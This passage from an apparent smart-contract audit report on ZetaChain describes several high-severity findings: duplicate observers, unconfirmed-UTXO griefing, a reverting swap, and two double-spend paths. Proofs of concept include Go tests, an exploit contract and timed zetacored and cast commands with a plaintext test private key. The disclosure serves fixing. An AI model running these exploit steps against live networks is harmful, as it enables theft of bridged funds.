Internally, in line [`36`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_update_observer.go#L36), the [`UpdateObserverAddress`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_update_observer.go#L86-L100) function is called to update the observer address in the `ObserverMapper` for each chain.

```go
086: func (k Keeper) UpdateObserverAddress(ctx sdk.Context, oldObserverAddress, newObserverAddress string) {
087: 	observerMappers := k.GetAllObserverMappers(ctx)
088: 	for _, om := range observerMappers {
089: 		UpdateObserverList(om.ObserverList, oldObserverAddress, newObserverAddress)
090: 		k.SetObserverMapper(ctx, om)
091: 	}
092: }
093:
094: func UpdateObserverList(list []string, oldObserverAddresss, newObserverAddress string) {
095: 	for i, observer := range list {
096: 		if observer == oldObserverAddresss {
097: 			list[i] = newObserverAddress
098: 		}
099: 	}
100: }
101:
```

However, a tombstoned observer is able to maliciously add a duplicate observer to the list by specifying an observer address (`NewObserverAddress`) in the `MsgUpdateObserver` message that is already in the `ObserverList` list.

As a result, the `ObserverList` list contains duplicates.

For the specific impact, please refer to the [Impact](#Impact) section.

### Test Case

The following test case demonstrates how the tombstoned `validator` can add a duplicate observer address:

<details>
  <summary><strong>Test case (click to reveal)</strong></summary>

```go
func TestAddDuplicateObserver(t *testing.T) {
	k, ctx := keepertest.ObserverKeeper(t)
	srv := keeper.NewMsgServerImpl(*k)
	// #nosec G404 test purpose - weak randomness is not an issue here
	r := rand.New(rand.NewSource(9))

	// Set validator in the store
	validator := sample.Validator(t, r)
	validatorOther := sample.Validator(t, r)
	validatorOther.Status = stakingtypes.Bonded
	validatorNew := sample.Validator(t, r)
	validatorNew.Status = stakingtypes.Bonded
	k.GetStakingKeeper().SetValidator(ctx, validatorNew)
	k.GetStakingKeeper().SetValidator(ctx, validator)
	k.GetStakingKeeper().SetValidator(ctx, validatorOther)

	consAddress, err := validator.GetConsAddr()
	assert.NoError(t, err)
	k.GetSlashingKeeper().SetValidatorSigningInfo(ctx, consAddress, slashingtypes.ValidatorSigningInfo{
		Address:             consAddress.String(),
		StartHeight:         0,
		JailedUntil:         ctx.BlockHeader().Time.Add(1000000 * time.Second),
		Tombstoned:          true,
		MissedBlocksCounter: 1,
	})

	chains := k.GetParams(ctx).GetSupportedChains()

	accAddressOfValidator, err := types.GetAccAddressFromOperatorAddress(validator.OperatorAddress)
	assert.NoError(t, err)

	accAddressOfOtherValidator, err := types.GetAccAddressFromOperatorAddress(validatorOther.OperatorAddress)
	assert.NoError(t, err)

	// newOperatorAddress, err := types.GetAccAddressFromOperatorAddress(validatorNew.OperatorAddress)
	// assert.NoError(t, err)

	count := uint64(0)
	for _, chain := range chains {
		k.SetObserverMapper(ctx, &types.ObserverMapper{
			ObserverChain: chain,
			ObserverList:  []string{accAddressOfValidator.String(), accAddressOfOtherValidator.String()},
		})
		count += 2
	}
	k.SetNodeAccount(ctx, types.NodeAccount{
		Operator: accAddressOfValidator.String(),
	})

	k.SetLastObserverCount(ctx, &types.LastObserverCount{
		Count: count,
	})

	_, err = srv.UpdateObserver(sdk.WrapSDKContext(ctx), &types.MsgUpdateObserver{
		Creator:            accAddressOfValidator.String(),
		OldObserverAddress: accAddressOfValidator.String(),
		NewObserverAddress: accAddressOfOtherValidator.String(),
		UpdateReason:       types.ObserverUpdateReason_Tombstoned,
	})
	assert.NoError(t, err)
	acc, found := k.GetNodeAccount(ctx, accAddressOfOtherValidator.String())
	assert.True(t, found)
	assert.Equal(t, accAddressOfOtherValidator.String(), acc.Operator)

	mapper, _ := k.GetObserverMapper(ctx, chains[0])

	assert.ElementsMatch(t, mapper.ObserverList, []string{accAddressOfOtherValidator.String(),   accAddressOfOtherValidator.String()}) // @audit-info Duplicate observers
}
```

**How to run this test case:**

Copy-pase the test case into `repos/node/x/observer/keeper/msg_server_update_observer_test.go` and run with `go test -v ./x/observer/keeper/msg_server_update_observer_test.go --run TestAddDuplicateObserver`

**Result:** The test will pass.

</details>

Please note that an admin can also accidentally add duplicate observers, [node/x/observer/keeper/msg_server_add_observer.go#L47](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_add_observer.go#L47)

### Recommended mitigation steps

Consider checking in the [`UpdateObserverAddress`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_update_observer.go#L86) function if the `newObserverAddress` is already in the list and return an error if it is.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/411#issuecomment-1877004372)**

***

## [[H-09] Using unconfirmed UTXOs as inputs for transactions is vulnerable to griefing attacks](https://github.com/code-423n4/2023-11-zetachain-findings/issues/402)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/402), also found by [ciphermarco](https://github.com/code-423n4/2023-11-zetachain-findings/issues/550)*

BTC transactions originating from the TSS address can be griefed by an attacker, preventing the TSS address from sending BTC transactions.

### Proof of Concept

The Bitcoin client retrieves all UTXO's for the TSS address with the [`FetchUTXOS`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/bitcoin_client.go#L711-L759) function. Subsequently, the UTXO's are [used as inputs for outgoing cctx's](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/btc_signer.go#L90) to cover the expenses of the transaction.

Concretely, the UTXOs are queried from the RPC by calling the `ListUnspentMinMaxAddresses` function in line [`737`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/bitcoin_client.go#L737). However, the first argument, the minimum number of confirmations, is set to 0.

```go
File: bitcoin_client.go
711: func (ob *BitcoinChainClient) FetchUTXOS() error {
...  	// [...]
720:
721: 	// get the current block height.
722: 	bh, err := ob.rpcClient.GetBlockCount()
723: 	if err != nil {
724: 		return fmt.Errorf("btc: error getting block height : %v", err)
725: 	}
726: 	maxConfirmations := int(bh)
727:
728: 	// List unspent.
729: 	tssAddr := ob.Tss.BTCAddress()
730: 	address, err := btcutil.DecodeAddress(tssAddr, config.BitconNetParams)
731: 	if err != nil {
732: 		return fmt.Errorf("btc: error decoding wallet address (%s) : %s", tssAddr, err.Error())
733: 	}
734: 	addresses := []btcutil.Address{address}
735:
736: 	// fetching all TSS utxos takes 160ms
737: ❌	utxos, err := ob.rpcClient.ListUnspentMinMaxAddresses(0, maxConfirmations, addresses)
...  	// [...]
759: }
```

As a result, the UTXOs returned by the RPC call include unconfirmed UTXOs, i.e., transaction outputs that are not yet confirmed by subsequent blocks.

Consequently, an attacker can craft a BTC transaction to the TSS address, with a low fee, and broadcast it to the network (the transaction outputs must match the range of UTXOs that will be used by the TSS address for the next transaction). While the transaction and its outputs are sitting unconfirmed in the mempool, the observer Bitcoin clients will retrieve these unconfirmed outputs as UTXOs.

The unconfirmed UTXOs are then used as inputs for outgoing TSS BTC transactions, which will also remain unconfirmed as long as the original transaction (from the attacker) remains unconfirmed. This can cause a halt in the outgoing BTC transactions from the TSS address.

Moreover, the attacker can replace the original transaction via the [Replace-by-fee (RBF) policy](https://bitcoinops.org/en/topics/replace-by-fee/), and change the recipient address to an address other than the TSS address. This will render the UTXOs used as inputs for the TSS's outgoing transaction invalid, causing the outgoing transaction to fail.

Comparing ZetaChain's UTXO retrieval mechanism with Thorchain's implementation, the latter treats unconfirmed UTXOs separately by checking if the UTXO was self-sent or sent from the Asgard address:

[bifrost/pkg/chainclients/bitcoin/client.go#L274-279](https://gitlab.com/thorchain/thornode/-/blob/develop/bifrost/pkg/chainclients/bitcoin/client.go#L274-279)

```go
if item.Confirmations == 0 {
  // pending tx in mempool, only count sends to self or from asgard
  if !c.isSelfTransaction(item.TxID) && !c.isAsgardAddress(item.Address) {
    continue
  }
}
```

[`Client.isSelfTransaction`](https://gitlab.com/thorchain/thornode/-/blob/4bf0118790ff3440c30ea64712af72f480b89cac/bifrost/pkg/chainclients/bitcoin/signer.go#L152-L170)

```go
// isSelfTransaction check the block meta to see whether the transactions is broadcast by ourselves
// if the transaction is broadcast by ourselves, then we should be able to spend the UTXO even it is still in mempool
// as such we could daisy chain the outbound transaction
func (c *Client) isSelfTransaction(txID string) bool {
	bms, err := c.temporalStorage.GetBlockMetas()
	if err != nil {
		c.logger.Err(err).Msg("fail to get block metas")
		return false
	}
	for _, item := range bms {
		for _, tx := range item.SelfTransactions {
			if strings.EqualFold(tx, txID) {
				c.logger.Debug().Msgf("%s is self transaction", txID)
				return true
			}
		}
	}
	return false
}
```

### Recommended mitigation steps

Consider only using unconfirmed UTXOs as inputs for outgoing transactions if the UTXOs were sent from the TSS address, similar to Thorchain's implementation.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/402#issuecomment-1882124077)**

***

## [[H-10] In ZetaTokenConsumerTrident.strategy.sol, swapping zeta for other tokens will always revert due to incorrect exactInputSingle router method  being used](https://github.com/code-423n4/2023-11-zetachain-findings/issues/387)
*Submitted by oakcobalt ([1](https://github.com/code-423n4/2023-11-zetachain-findings/issues/387), [2](https://github.com/code-423n4/2023-11-zetachain-findings/issues/388))*

Swapping zeta for other tokens through `getZetaFromToken()` will always revert in ZetaTokenConsumerTrident.strategy.sol, due to calling the incorrect `exactInputSingle` router method.

### Proof of Concept

In ZetaTokenConsumerTrident.strategy.sol, when swapping other tokens for zetaToken, `getZetaFromToken()` will be called and the function will first transfer inputToken from caller and approve `tridentRouter` to spend `inputTokenAmount`. Then it will call `tridentRouter.exactInputSingle(params)` for `tridentRouter` to execute token swap.

However, `exactInputSingle()` is the incorrect function for the use case and will always revert. In current TridentRouter.sol implementation, bento balance will be called to transfer from ZetaTokenConsumerTrident.strategy.sol first, but ZetaTokenConsumerTrident.strategy.sol doesn't have means to deposit into bento, neither will it approve `TridentRouter` to manage it's bento tokens.

```solidity
//contracts/evm/tools/ZetaTokenConsumerTrident.strategy.sol
    function getZetaFromToken(
        address destinationAddress,
        uint256 minAmountOut,
        address inputToken,
        uint256 inputTokenAmount
    ) external override returns (uint256) {
...
        IERC20(inputToken).safeTransferFrom(msg.sender, address(this), inputTokenAmount);
        IERC20(inputToken).safeApprove(address(tridentRouter), inputTokenAmount);
        (address token0, address token1) = getPair(zetaToken, WETH9Address);
        address[] memory pairPools = poolFactory.getPools(token0, token1, 0, 1);
        IPoolRouter.ExactInputSingleParams memory params = IPoolRouter.ExactInputSingleParams({
            tokenIn: zetaToken,
            amountIn: zetaTokenAmount,
            amountOutMinimum: minAmountOut,
            pool: pairPools[0],
            to: destinationAddress,
            unwrap: true
        });
        //@audit tridentRouter.exactInputSingle will not transfer inputToken, but only tries to transfer bento shares which this contract has no means to deposit nor approve. This will cause transaction revert.
|>      uint256 amountOut = tridentRouter.exactInputSingle(params);
...
```

(<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerTrident.strategy.sol#L159>)

```solidity
//https://github.com/sushiswap/trident/blob/master/contracts/TridentRouter.sol
    function exactInputSingle(ExactInputSingleParams calldata params) public payable returns (uint256 amountOut) {
        // Prefund the pool with token A.
//@audit this modifies bento shares balances, not the actual inputToken balance
|>      bento.transfer(params.tokenIn, msg.sender, params.pool, params.amountIn);
        // Trigger the swap in the pool.
        amountOut = IPool(params.pool).swap(params.data);
        // Ensure that the slippage wasn't too much. This assumes that the pool is honest.
        if (amountOut < params.amountOutMinimum) revert TooLittleReceived();
    }
```

```solidity
//https://etherscan.io/address/0xf5bce5077908a1b7370b9ae04adc565ebd643966#code
//@audit allowed(from) modifier will check approval allowance for caller to manage bento shares, in this case, caller will be TridentRouter, and from will be ZetaTokenConsumerTrident.strategy.sol. 
    function transfer(
        IERC20 token,
        address from,
        address to,
        uint256 share
    ) public allowed(from) {
        // Checks
        require(to != address(0), "BentoBox: to not set"); // To avoid a bad UI from burning funds

        // Effects
|>      balanceOf[token][from] = balanceOf[token][from].sub(share);
        balanceOf[token][to] = balanceOf[token][to].add(share);

        emit LogTransfer(token, from, to, share);
    }
```

As seen above, `tridentRouter.exactInputSingle()` will try to modify bento shares of inputToken, instead of the actual raw erc-20, causing the transaction to revert.
Any transactions or flows that involve `getZetaFromToken()` will fail.

### Recommended Mitigation Steps

In `ZetaTokenConsumerTrident.strategy.sol` `getZetaFromToken()`, use `tridentRouter.exactInputSingleWithNativeToken()` instead, which is designed to handle raw ERC-20 token and will deposit into Bento on behalf of `ZetaTokenConsumerTrident.strategy` first and then perform the swap.

**[lumtis (ZetaChain) disputed and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/387#issuecomment-1877794740):**
 > We no longer use this contract as Klaytn is not supported anymore

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/387#issuecomment-1880153139):**
 > [Screenshot 2024-01-07 at 3 44 26 PM](https://github.com/code-423n4/2023-11-zetachain-findings/assets/15096737/3a185c00-94f2-400e-890c-105c3210abd1)
> 
> @lumtis While that may be the case, it was included in the audit scope as far as I can tell. Unless this is documented somewhere that I am missing the report is still valid and should be awarded (the warden did work based on the pre-determined scope of the audit).

***

## [[H-11] Outbound Confirmation Tracker Race Condition Leads to a Double Spend](https://github.com/code-423n4/2023-11-zetachain-findings/issues/338)
*Submitted by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/338)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L610> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L295>

In the Zellic audit, the report `3.2 Bonded validators can trigger reverts for successful transactions` points out that the `RemoveFromOutTxTracker` can be called by any bonded validator. They mention this as being an issue then mention an exploit path to use, which is the focus of that finding. The `RemoveFromOutTxTracker` issue resulting from bad access control issue was remediated, however there is another way to use the same exploit.

Their method of exploitation is as follows:

1.  Create a CCTX from one EVM chain to a different EVM chain, transferring ZETA
2.  Process the incoming event so that it's put into the `PendingOutbound` state.
3.  The zetaclient signs the transaction with the `TryProcessOutTx` then broadcasts this to the EVM. Right after the voting, the zetaclient will also add the transaction to the `OutboundTxTracker`.
4.  Call `RemoveFromOutTxTracker` to remove the outbound transaction so that the Zetaclient will never see it. While this exact method is fixed, we can replicate the *removal* with a race condition that will be described below.
5.  Call `AddToOutTxTracker` where the same nonce as the transaction from the TSS address. Make this a reverted transaction so that we trick the processing to eventually call `onRevert`.
6.  `observeTxOut` picks up the FAKE transaction as being reverted, even though it actually succeeded. This will put the tx into the `ob.outTXConfirmationTransaction` and `ob.outTXConfirmationReceipts` structure.
7.  With the transactions and receipt in the structures, another thread calls `PostReceiveConfirmation` on our fake transaction as being reverted. After enough of these, a vote passes that validates that the transaction did in fact fail.
8.  The revert flow will occur. This will send us back the funds on the EVM chain even though they were already sent once in the original transaction.

By adding a reverted transaction to the `OutTxTracker` at just the right moment, it is possible to cause a **race condition** where the real transaction is broadcasted to the outbound chain but the wrong tx is processed through the queue for the `OutTracker`. This is able to replicate the effect of step 4 of the Zellic method, since we can get our fake transaction processed *first* in the voting process. The timing for performing a double spend is very tight though. In particular, the function must be within the *signing* process of our CCTX but has NOT added the TX to the outbound queue yet when we add the function to the `OutTxTracker`. If this is done, a double spend will occur. However, causing a denial of service by sending the fake transaction as soon as possible is trivial. We were able to replicate the double spend a few times but got the denial of service every time. The double spend has a [video](https://www.youtube.com/watch?v=i360xH6ex\_4) below since it is hard to trigger.

The real issue stems from the items going into the `ob.outTXConfirmationTransaction` and `ob.outTXConfirmationReceipts` structure without the *events* ever being validated properly. Additionally, only the *first* item within a given `OutTxTracker` is ever used. The only item that is validated on the processing is that the *nonce* of the transaction matches the nonce of the TSS CCTX. However, this is trivial to bypass using a different key.

Another interesting point is *who* can trigger the vulnerability. For testing, we mostly used an observer because we never got the *proof* functionality working. To our understanding, this provides three checks:

*   The `To()` must be to the connector address.
*   The block header for the TX must be uploaded. This means that the confirmation point must be reached.
*   The TX must be valid and occurred.

All of these are trivial to bypass. First, we simply send a transaction to the `connector` that fails for whatever reason, which satisfies part 1. Part 2 can be bypassed by simply waiting for enough blocks on our fake transaction. Part 3 can be bypassed by using a valid proof, which should be easy to do.

All of this together means that any user can exploit the double spend but it's much easier for observers to do, since no proof is required. This was only tested on Ethereum but may also work on Bitcoin as well. This vulnerability is live on the existing system.

### Proof of Concept

**Setup**

The setup for exploitation on this is complicated within the test environment. Messing up a single step will make this not work. If there is difficultly in reproducing, please reach out and we can demonstrate it. Here is a [video](https://www.youtube.com/watch?v=i360xH6ex\_4) of the exploit occurring as well.

*   Easy way to get `ZETA` for testing. This is shown in the steps below.
*   An account that is at the same nonce as the TSS address. Be careful of off by 1 errors here, as `cast` from foundry shows the NEXT nonce and not the nonce of the previous transaction.

To demonstrate the exploitabilty of this, we will show the denial of service to block an incoming transaction. Additionally, we will use the `observer` instead of a regular user so that we do not have to specify proofs. However, this can be used for a double spend by any user, given the proper timing and proof. It is recommended to read the steps ahead of time because the *timing* of everything is crucial. To make this easier, prepare the commands in a terminal to be ready to go.

**Exploit Steps for DoS**

1.  Get the nonce of the next CCTX. This can be done using the `zetacored` binary. A command with `zetacored` and jq is used below:
        zetacored query crosschain list-chain-nonces -o json  | jq '.ChainNonces[] | select(.chain_id == "1337") | .nonce' -r

2.  Using some private key, get a transaction to fail using the **same nonce as the TSS address** above. There is a security check that we need to bypass using this. To do this, I deployed the following contract and called it multiple times until the reverted transaction matched the nonce. Keep the hash that reverted for later.
        contract ForcedRevert {
            function revertMe() external {
                    revert("Bad!");
            }
        }

3.  Deploy the following contract. The `ZetaInteractor` and `ZetaReceiver` interfaces can be imported or copied in. For our testing, we mostly used Remix so we copied the necessary contracts in.

```

    contract DoubleSpend is ZetaInteractor, ZetaReceiver {

        IERC20 _zetaToken;
        uint256 public calledMessage = 0;
        uint256 public calledRevert = 0;
        bytes32 public constant CROSS_CHAIN_MESSAGE_MESSAGE_TYPE =
            keccak256("CROSS_CHAIN_CROSS_CHAIN_MESSAGE");

        // 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9, 0xA8D5060feb6B456e886F023709A2795373691E63
        constructor(
            address connectorAddress,
            address zetaTokenAddress
        ) ZetaInteractor(connectorAddress) {
            _zetaToken = IERC20(zetaTokenAddress);
        }

        function onZetaMessage(ZetaInterfaces.ZetaMessage calldata zetaMessage) external override{
            calledMessage += 1; 
        }

        function onZetaRevert(ZetaInterfaces.ZetaRevert calldata zetaRevert) external override{
            calledRevert += 1;
        }   


        function TriggerBug () public payable{
            uint256 destinationChainId = 1337;
            uint256 zetaValueAndGas = _zetaToken.balanceOf(address(this)) / 4; 

            _zetaToken.approve(address(connector), zetaValueAndGas);
            
            // Make the CCTX
            connector.send(
                ZetaInterfaces.SendInput({
                    destinationChainId: destinationChainId,
                    destinationAddress: abi.encodePacked(address(this)), // Send to ourselves
                    destinationGasLimit: 300000,
                    message: abi.encode(CROSS_CHAIN_MESSAGE_MESSAGE_TYPE, "Hey!"),
                    zetaValueAndGas: zetaValueAndGas,
                    zetaParams: abi.encode("")
                })
            );
        }
    }
```

4.  Give the contract 50 ZETA for the test. An easy way to do this is using the admin private key to change the TSS address of the user to itself then sending the ZETA.

    ```
    ## Update the TSS to a controlled user 
    cast send 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9 "function updateTssAddress(address tssAddress_)" 0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC --private-key d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263

    ## Call to change the information there 
    cast send 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9 "function onReceive(bytes calldata zetaTxSenderAddress, uint256 sourceChainId, address destinationAddress, uint256 zetaValue, bytes calldata message,bytes32 internalSendHash)" "" 1337 <CONTRACT_ADDRESS> 50000000000000000000 "" 0x0000000000000000000000000000000000000000000000000000000000000001 --private-key d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263

    # Update back in the TSS address
    cast send 0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9 "function updateTssAddress(address tssAddress_)" <TSS_ETH_KEY> --private-key d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263
    ```

5.  Execute the function `TriggerBug()` with the address of the deployed contract. This will trigger the CCTX that we need to exploit this issue.

6.  Wait for the transaction to be in the `PendingOutbound` state. This can be queried using the command `zetacored query crosschain list-pending-cctx 1337`.

7.  As soon as the transaction goes into the `PendingOutbound` state, add it to the OutTracker queue. It is super important that our transaction is added BEFORE the real one is put in by the zetaclient. This is because the first transaction in the queue is the first one processed. To attempt a double spend, change the timing to be slightly later. We found that 5 seconds seems like the magic number but it was very inconsistent. An example command to add the hash to the queue is shown below:

        zetacored tx crosschain add-to-out-tx-tracker 1337 <TSS NONCE> <HASH> --from `zetacored keys list --output json | jq '.[0].address' -r` --yes --fees 10000azeta

8.  Wait for the transaction to finish. To view pending transaction use the command `zetacored query crosschain list-pending-cctx 1337`.

9.  Query all CCTXs to see the status of the TX. This can be done with the following command to search for a given nonce:

        zetacored query crosschain list-cctx 1337 -o json | jq '.CrossChainTx[] | select(.outbound_tx_params[0].outbound_tx_tss_nonce == "<NONCE>")'

10. Notice that the "status" of the transaction is `reverted` with TWO outbound params instead of one. This indicates that we were able to set the state of the transaction, even though it was the wrong one. Sometimes, doing this can stop the environment from working or get transactions stuck as well. This all depends on the timing in which this occurred.

```

      "cctx_status": {
        "status": "Reverted",
        ...
      },
```

11. If you were going for the double spend, check the balance of the contract and notice that it is larger than the balance before. A [video](https://www.youtube.com/watch?v=i360xH6ex\_4) of the double spend being explained can used as well.

### Remediation

The crux of the original issue was not the bad permissions of the `RemoveFromOutTxTracker` message but certainly makes it much easier to exploit. To remediate this, we need to fix the underlying problem of the Zellic exploit method.

The `ob.outTXConfirmationTransaction` and `ob.outTXConfirmationReceipts` variables do not validate the events associated with the transaction hash. There is an assumption that the transaction hash presented matches the nonce that was provided, which is not necessarily true.

There are few things that need to be fixed. To prevent the double spend by tricking the program to see a reverted transaction, the `from` of the TSS needs to be checked to be the `tss address`. Otherwise, it is possible to trick the processing to use the wrong transaction.

To prevent a denial of service using this technique is a bit more complicated. Currently, the *first* of the item put into the `OutTxTracker` is the one that will be processed as the proper one. This is because once the `ob.outTXConfirmationTransaction` and `ob.outTXConfirmationReceipts` objects are set, they cannot be *updated*. Iterating over all of the items in the list would remediate this issue. It would require some rework of the program in order to do though.

This still may be insufficient but we couldn't find a workaround for these. The usage of the multi-threaded code makes this very hard to follow. It is recommended that the Zetachain team takes a long look at how this works to ensure there aren't other exploit methods.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/338#issuecomment-1877796896)**

***

## [[H-12] Inconsistent Voting Index Leads to Double Spends in Future](https://github.com/code-423n4/2023-11-zetachain-findings/issues/327)
*Submitted by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/327)*

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/proto/crosschain/tx.proto#L141>

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/proto/crosschain/tx.proto#L117>

The voting process works as follows:

1.  An observer sees an event and sends a message to Zetachain to vote on the occurrence.
2.  The message structure is hashed to determine the ballot to be used.
3.  The vote is added based upon the hashed value.
4.  If enough votes have been received, then the finalization occurs. This means relaying to the zEVM or another chain.

The `index` of an observed transaction `MsgVoteOnObservedInboundTx` is calculated by taking a *hash* of the incoming message. For every observer that votes on a given event, the index should be the same. The protection in place for stopping *duplicate* transactions is simply checking if this `index` has occurred already. Since the ballots are never deleted, this works well.

However, the `index` is *too granular*. Many aspects of an event are guaranteed to not change: sender/receiver change, tx hash, amount, cointype, etc. This is NOT the case with several of the fields that are hardcoded into the Zetaclient but may change in the future. Gaslimit (hardcoded in app) and asset (which is currently blank) are unused fields that may change in the future. On top of this, a change in encoding, what the zetaclient signs or anything else would result in a different hash as well.

Additionally, any newly added fields would change the index of previous ballots as well. If this sounds farfetched, there is already a case of this happening since deployment. The field `eventIndex` was added very recently to the repository, since multiple events can happen within a single transaction. If the current Zetachain deployment had the `AddToInTxTracker` then it would be possible to exploit the new `eventIndex` field changes the hash to retrigger the CCTX.

If any of these values change in the future, then the ballot `index` would change. Since this index is the only security protection for duplicate submissions, the same event could be submitted once again. To make matters worse, there is nothing within the `TxInTracker` on the zetachain or zetaclient that checks that an event has already occurred. This allows for trivial exploitation when the client or parts of the message are updated.

Relying on this index to never change is an unspoken variant now. Since this is not mentioned anywhere, a tiny change made by a developer would result in every CCTX previously created to be valid in the voting process once again. Although there is some waiting involved, a malicious adversary could send CCTXs and simply wait for them to be valid again once a change to the Zetachain or Zetaclient is made.

Attack strategy:

1.  Transfer BTC, ETH, ERC20 and Zeta between several different chains in large quantities.
2.  Wait for a change in one of the above fields to occur within the Zetaclient.
3.  Resubmit an old transaction into the `TxInTracker` with a proof. The zetaclient will see this and all observers will vote on the event occurrence.
4.  Massive profit from duplicate event submission. This can only be done once for very change on the fields. With enough sending of funds back and forth prior to the update, this could lead to massive profits for an attacker.

### Proof of Concept

This proof of concept demonstrates the issue from the Cosmos SDK tests. It sends two events that only differ by the `GasLimit` and checks if they get approved or not. To make the proof of concept more viable, you could simulate a change on the zetaclient parameters and send a proof through the `TxInTracker` afterwards. Since this requires a change to the zetaclient live, we felt that a Cosmos SDK PoC was clearer to reproduce and easier to understand.

1.  Copy the following code into the location `repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx_test.go`.

<details>

```golang
package keeper_test

import (
	"encoding/hex"
	"fmt"
	"testing"

	//"github.com/zeta-chain/zetacore/common"
	sdkmath "cosmossdk.io/math"
	sdk "github.com/cosmos/cosmos-sdk/types"
	"github.com/stretchr/testify/assert"
	keepertest "github.com/zeta-chain/zetacore/testutil/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/keeper"
	"github.com/zeta-chain/zetacore/x/crosschain/types"
	observerTypes "github.com/zeta-chain/zetacore/x/observer/types"
	observertypes "github.com/zeta-chain/zetacore/x/observer/types"
)

/*
Potential Double Event Submission
*/
func TestNoDoubleEventProtections(t *testing.T) {
	k, ctx, _, zk := keepertest.CrosschainKeeper(t)

	// MsgServer for the crosschain keeper
	msgServer := keeper.NewMsgServerImpl(*k)

	// Set the chain ids we want to use to be valid
	params := observertypes.DefaultParams()
	zk.ObserverKeeper.SetParams(
		ctx, params,
	)

	// Convert the validator address into a user address.
	validators := k.StakingKeeper.GetAllValidators(ctx)
	validatorAddress := validators[0].OperatorAddress
	valAddr, _ := sdk.ValAddressFromBech32(validatorAddress)
	addresstmp, err := sdk.AccAddressFromHexUnsafe(hex.EncodeToString(valAddr.Bytes()))
	validatorAddr := addresstmp.String()

	// Add validator to the observer list for voting
	chains := zk.ObserverKeeper.GetParams(ctx).GetSupportedChains()
	for _, chain := range chains {
		zk.ObserverKeeper.SetObserverMapper(ctx, &observertypes.ObserverMapper{
			ObserverChain: chain,
			ObserverList:  []string{validatorAddr},
		})
	}

	// Vote on the FIRST message.
	msg := &types.MsgVoteOnObservedInboundTx{
		Creator:       validatorAddr,
		Sender:        "0x954598965C2aCdA2885B037561526260764095B8",
		SenderChainId: 1, // ETH
		Receiver:      "0x954598965C2aCdA2885B037561526260764095B8",
		ReceiverChain: 7000, // zetachain
		Amount:        sdkmath.NewUintFromString("10000000"),
		Message:       "",
		InBlockHeight: 1,
		GasLimit:      1000000000,
		InTxHash:      "0x7a900ef978743f91f57ca47c6d1a1add75df4d3531da17671e9cf149e1aefe0b",
		CoinType:      0, // zeta
		TxOrigin:      "0x954598965C2aCdA2885B037561526260764095B8",
		Asset:         "",
		EventIndex:    1,
	}
	_, err = msgServer.VoteOnObservedInboundTx(
		ctx,
		msg,
	)
	assert.Equal(t, err, nil)

	// Check that the vote passed
	ballot, _, _ := zk.ObserverKeeper.FindBallot(ctx, msg.Digest(), zk.ObserverKeeper.GetParams(ctx).GetChainFromChainID(msg.SenderChainId), observerTypes.ObservationType_InBoundTx)
	if ballot.BallotStatus == observerTypes.BallotStatus_BallotFinalized_SuccessObservation {
		fmt.Println("First ballot passed!")
	} else {
		fmt.Println("First ballot failed!")
	}

	//Perform the SAME event. Except, this time, we resubmit the event.
	msg2 := &types.MsgVoteOnObservedInboundTx{
		Creator:       validatorAddr,
		Sender:        "0x954598965C2aCdA2885B037561526260764095B8",
		SenderChainId: 1,
		Receiver:      "0x954598965C2aCdA2885B037561526260764095B8",
		ReceiverChain: 7000,
		Amount:        sdkmath.NewUintFromString("10000000"),
		Message:       "",
		InBlockHeight: 1,
		GasLimit:      1000000001, // <---- Change here
		InTxHash:      "0x7a900ef978743f91f57ca47c6d1a1add75df4d3531da17671e9cf149e1aefe0b",
		CoinType:      0,
		TxOrigin:      "0x954598965C2aCdA2885B037561526260764095B8",
		Asset:         "",
		EventIndex:    1,
	}

	fmt.Println("Vote again with the same TxHash")
	_, err = msgServer.VoteOnObservedInboundTx(
		ctx,
		msg2,
	)

	assert.Equal(t, err, nil)

	fmt.Println("Treated as a separate event.")
	fmt.Println("In many years, things may change... GasLimit, message, asset... If any of these change, a double spend is possible. Since thesea are not guarenteed to stay the same, this is worrisome.")
